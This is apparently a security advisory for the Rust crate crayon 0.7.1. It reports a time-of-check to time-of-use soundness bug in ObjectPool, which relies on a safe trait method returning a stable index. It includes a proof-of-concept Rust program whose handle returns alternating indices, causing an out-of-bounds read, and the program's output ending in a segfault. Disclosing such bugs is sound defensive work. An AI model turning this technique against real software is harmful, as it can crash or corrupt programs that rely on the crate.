### Description

Unsafe code in `ObjectPool` has time-of-check to time-of-use (TOCTOU) bug that
can eventually lead to a memory safety violation. `ObjectPool` and `HandlePool`
implicitly assumes that `HandleLike` trait methods are pure, i.e., they always
return the same value. However, this assumption is unsound since `HandleLike`
is a safe, public trait that allows a custom implementation.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

# Description

Unsafe code in `ObjectPool` has time-of-check to time-of-use (TOCTOU) bug that can eventually lead to a memory safety violation. `ObjectPool` and `HandlePool` implicitly assumes that `HandleLike` trait methods are pure, i.e., they always return the same value. However, this assumption is unsound since `HandleLike` is a safe, public trait that allows a custom implementation.

# Demonstration

* Crate: crayon
* Version: 0.7.1
* OS: Ubuntu 18.04.5 LTS
* Rust: rustc 1.46.0 (04488afe3 2020-08-24)

```
#![forbid(unsafe_code)]

use crayon::utils::handle::{HandleIndex, HandleLike};
use crayon::utils::object_pool::ObjectPool;
use std::sync::atomic::{AtomicBool, Ordering};

#[derive(Debug)]
struct DropDetector(u32);

impl Drop for DropDetector {
    fn drop(&mut self) {
        println!("Dropping {}", self.0);
    }
}

static FLAG: AtomicBool = AtomicBool::new(false);

#[derive(Debug, Clone, Copy, Hash, PartialEq, Eq)]
struct MyHandle {
    indices: [HandleIndex; 2],
    version: HandleIndex,
}

impl HandleLike for MyHandle {
    fn new(index: HandleIndex, version: HandleIndex) -> Self {
        MyHandle {
            indices: [index, index],
            version,
        }
    }

    fn index(&self) -> HandleIndex {
        if dbg!(FLAG.fetch_xor(true, Ordering::Relaxed)) {
            self.indices[1]
        } else {
            self.indices[0]
        }
    }

    fn version(&self) -> HandleIndex {
        self.version
    }
}

impl MyHandle {
    fn with_indices(indices: [HandleIndex; 2], version: HandleIndex) -> Self {
        MyHandle { indices, version }
    }
}

fn main() {
    let mut pool = ObjectPool::new();
    let real_handle: MyHandle = pool.create(123);
    let fake_handle =
        MyHandle::with_indices([real_handle.index(), 12345678], real_handle.version());

    // Segfault with OOB, accessing`pool.entries[12345678]` without boundary checking
    dbg!(pool.get(fake_handle));

    // The bug can be similarly triggered in all other methods of `ObjectPool`
    // that call `handle.index()` in an unsafe block.
}
```

Output:

```
[src/main.rs:57] FLAG.fetch_xor(true, Ordering::Relaxed) = false
[src/main.rs:57] FLAG.fetch_xor(true, Ordering::Relaxed) = true
[src/main.rs:57] FLAG.fetch_xor(true, Ordering::Relaxed) = false
[src/main.rs:57] FLAG.fetch_xor(true, Ordering::Relaxed) = true
[src/main.rs:82] pool.get(fake_handle) = Some(

```

Return Code: -11 (SIGSEGV)
